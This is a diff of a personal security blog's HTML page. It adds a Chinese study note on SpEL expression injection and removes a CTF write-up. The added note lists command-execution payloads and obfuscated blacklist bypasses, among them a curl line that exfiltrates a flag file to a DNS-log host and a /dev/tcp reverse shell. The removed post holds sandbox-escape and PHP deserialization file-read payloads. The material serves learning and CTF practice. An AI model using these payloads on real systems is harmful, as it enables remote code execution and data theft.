@@ -66,6 +66,196 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-05-06T07:13:00.196Z" itemprop="datePublished">2020-05-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
+<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
+//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());
+String message = (String) exp.getValue();
+//String message = exp.getValue(String.class);
+</code></pre>
+<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
+<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
+<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
+String message = (String) exp.getValue();</code></pre>
+<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
+<p>访问属性：</p>
+<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);
+System.out.println((Object)exp.getValue());</code></pre>
+<p>方法调用：</p>
+<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);
+System.out.println((Object)exp.getValue());</code></pre>
+<p>调用构造函数：</p>
+<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);
+System.out.println((Object)exp.getValue());</code></pre>
+<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);
+        System.out.println((Object)exp.getValue(new Object(){
+            public String fucker=&quot;fucker&quot;;
+            public String tou(){
+                return &quot;toutoutou&quot;;
+            };
+        }));</code></pre>
+<p>结果：<code>fuckertoutoutou</code></p>
+<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendar
+GregorianCalendar c = new GregorianCalendar();
+c.set(1856, 7, 9);
+
+// The constructor arguments are name, birthday, and nationality.
+Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);
+
+ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;name&quot;);
+
+EvaluationContext context = new StandardEvaluationContext(tesla);
+String name = (String) exp.getValue(context);</code></pre>
+<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
+<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendar
+GregorianCalendar c = new GregorianCalendar();
+c.set(1856, 7, 9);
+
+// The constructor arguments are name, birthday, and nationality.
+Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);
+
+ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;name&quot;);
+String name = (String) exp.getValue(tesla);</code></pre>
+<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
+<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
+
+// Inventions Array
+StandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);
+
+// evaluates to &quot;Induction motor&quot;
+String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(
+        teslaContext, String.class);
+
+// Members List
+StandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);
+
+// evaluates to &quot;Nikola Tesla&quot;
+String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(
+        societyContext, String.class);
+
+// List and Array navigation
+// evaluates to &quot;Wireless communication&quot;
+String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(
+        societyContext, String.class);</code></pre>
+<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
+<pre><code class="java">// Officer&#39;s Dictionary
+
+Inventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(
+        societyContext, Inventor.class);
+
+// evaluates to &quot;Idvor&quot;
+String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(
+        societyContext, String.class);
+
+// setting values
+parser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(
+        societyContext, &quot;Croatia&quot;);</code></pre>
+<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
+<pre><code class="java">// evaluates to a Java list containing the four numbers
+List numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);
+
+List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre>
+<p>字典：</p>
+<pre><code class="java">// evaluates to a Java map containing the two entries
+Map inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);
+
+Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre>
+<p>数组：</p>
+<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
+<pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre>
+<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
+<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  *<em>T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 *</em></p>
+<pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);
+
+Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);
+
+boolean trueValue = parser.parseExpression(
+        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)
+        .getValue(Boolean.class);</code></pre>
+<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
+<pre><code class="java">String randomPhrase = parser.parseExpression(
+        &quot;random number is #{T(java.lang.Math).random()}&quot;,
+        new TemplateParserContext()).getValue(String.class);</code></pre>
+<p>结果：<code>random number is xxxx</code></p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
+<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
+<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
+<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)
+T(Thread).sleep(10000)
+#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)
+new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>利用反射构造绕过黑名单</p>
+<pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>利用ScriptEngineManager构造绕过黑名单</p>
+<pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()
+    .getEngineByName(&quot;nashorn&quot;)
+        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre>
+<pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]
+    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]
+        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]{,,...})</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
+<pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
+<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
+<ul>
+<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
+<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p>
+<p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  文档</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/">http://blog.ccreater.top/2020/05/06/SpEL表达式注入漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr22000iv4v0a3rqb815" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-de1ctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/05/06/de1ctf2020/" class="article-date">
@@ -4552,212 +4742,6 @@ https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l8
 
 
   
-    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
-  <time class="dt-published" datetime="2020-04-20T12:44:22.257Z" itemprop="datePublished">2020-04-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
-<p>getattr:对沙箱逃逸有很大作用</p>
-<p>list(s)获得字符集,可以用来绕过引号限制</p>
-<p>试了一下system</p>
-<pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre>
-<p>发现引号和点都被过滤了,不过提示说</p>
-<pre><code class="python">def hello():
-   os.system(&quot;echo hello&quot;)</code></pre>
-<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
-<p>而引号被过滤可以用字符串s里的值来绕过</p>
-<pre><code class="python">#考虑这样来
-a=getattr(os,&#39;system&#39;)
-a(&quot;命令&quot;)</code></pre>
-<pre><code class="python">def get_str(string):
-    result=&#39;&#39;
-    for i in string:
-        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;
-    return result[:-1]
-conn=remote(&#39;47.97.253.115&#39;,10005)
-conn.sendline(&#39;table=list(s)&#39;)
-conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))
-conn.sendline(&#39;fun=getattr(os,sys)&#39;)
-while 1:
-        command=input(&#39;(www):$&#39;)
-        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;
-        conn.sendline(new_com)
-        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))
-conn.close()
-</code></pre>
-<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
-<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
-<p>所有的数据都是32个字符</p>
-<p>所以猜测是md5加密</p>
-<p>找出符合md5格式的数据</p>
-<p>68dffd5a1be838b5326209714f7ea7a5</p>
-<p>解密后提交flag{n3k0}失败</p>
-<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
-<p>成功</p>
-<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
-<pre><code class="php">&lt;?php
-
-class Hello {
-    protected $a;
-
-    function test() {
-        $b = strpos($this-&gt;a, &#39;flag&#39;);
-        if($b) {
-            die(&quot;Bye!&quot;);
-        }
-        $c = curl_init();
-        curl_setopt($c, CURLOPT_URL, $this-&gt;a);
-        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
-        echo curl_exec($c);
-    }
-
-    function __destruct(){
-        $this-&gt;test();
-    }
-}
-
-if (isset($_GET[&quot;z&quot;])) {
-    unserialize($_GET[&quot;z&quot;]);
-} else {
-    highlight_file(__FILE__);
-}</code></pre>
-<p>curl_exec+反序列化</p>
-<p>试了下本地文件读取</p>
-<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
-<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
-<p>题目过滤flag字符</p>
-<p>说明我们flag就在flag文件里</p>
-<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
-<p>最后的payload:</p>
-<p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
-<p>这里有一些坑就是:</p>
-<ol>
-<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
-</li>
-<li><p>因为是二次编码所以要注意字符串的长度</p>
-</li>
-</ol>
-<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
-<p>发现onion.jpg文件尾后还有数据</p>
-<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
-<p>zip格式,get一个新的加密压缩包</p>
-<p>密码在hint里有提示</p>
-<p>接下来就是很普通的写python了</p>
-<pre><code class="python">import zipfile
-def burp(filename,hint):
-    password=&#39;&#39;
-    i=0
-    for i in range(32,128):
-        password=hint.replace(&#39;?&#39;,chr(i))
-        with zipfile.ZipFile(filename) as myzip:
-            try :
-                print(&quot;解密:&quot;+filename+&quot;:&quot;+password)
-                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))
-                break
-                return password
-            except RuntimeError: 
-                print(&quot;解密失败&quot;)
-            except FileNotFoundError:
-                input(&#39;过来康康&#39;)
-            except zipfile.zlib.error:
-                print(&quot;跳过&quot;)
-    if i==127:
-        print(&quot;爆破失败&quot;)
-        exit()
-    print(&#39;爆破成功&#39;+password)
-    return password
-
-def writebyte(bbyte,filename):
-    f=open(filename,&#39;wb&#39;)
-    f.write(bbyte)
-    f.close()
-def readbyte(filename):
-    f=open(filename,&#39;rb&#39;)
-    bbyte=f.read()
-    f.close()
-    return bbyte
-
-nullbyte=b&#39;&#39;
-while 1:
-    f=open(&#39;temp.txt&#39;,&#39;r&#39;)
-    hint=f.read()[12:]
-    f.close()
-    pwd=burp(&#39;onion1.zip&#39;,hint)
-
-    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:
-        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
-        writebyte(str,&quot;temp.zip&quot;)
-        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
-        writebyte(str,&quot;temp.txt&quot;)
-    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)
-
-</code></pre>
-<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
-<pre><code class="python">def encrypt(data,groupnums):
-    a=[]
-    b=[]
-    section=int(len(data)/groupnums)
-    for i in range(0,len(data),section):
-        a.append(data[i:i+section])
-    for i in range(section):
-        for j in range(groupnums):
-            b.append(a[j][i])
-    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))
-    return cipher
-def decrypt(data):
-    result=[]
-    for i in range(1,len(data)+1):
-        result.append(encrypt(data,i))
-    return result
-
-may_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)
-for i in may_r:
-    print(i[::2]+i[1::2])</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/">http://blog.ccreater.top/2020/04/20/2019xman个人排位赛wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cka3ckr1o0002v4v00vwvd36g" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -4815,6 +4799,10 @@ for i in may_r:
       <ul>
         
           <li>
+            <a href="/2020/07/29/CyBRICS2020/">CyBRICS2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
           </li>
         
@@ -4828,10 +4816,6 @@ for i in may_r:
         
           <li>
             <a href="/2020/06/30/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/30/tctf2020/">tctf2020</a>
           </li>
         
       </ul>
